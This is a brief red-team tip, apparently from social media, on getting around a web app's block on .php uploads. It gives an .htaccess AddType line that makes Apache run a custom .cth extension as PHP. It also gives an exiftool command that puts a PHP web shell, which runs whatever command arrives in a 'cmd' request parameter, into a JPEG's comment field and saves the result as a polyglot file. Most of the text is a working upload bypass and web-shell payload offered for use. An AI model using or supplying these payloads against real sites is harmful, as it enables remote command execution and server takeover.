Red Teamers, web app tip today! You have file upload, but .php files are disallowed?
What if you could tell Apache to interpret an arbitrary file ext as .php?
Upload the following as a .htaccess, and now .cth is as good as .php!

"AddType application/x-httpd-php .cth"

exiftool -Comment='<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>' red.jpg -o poly.php
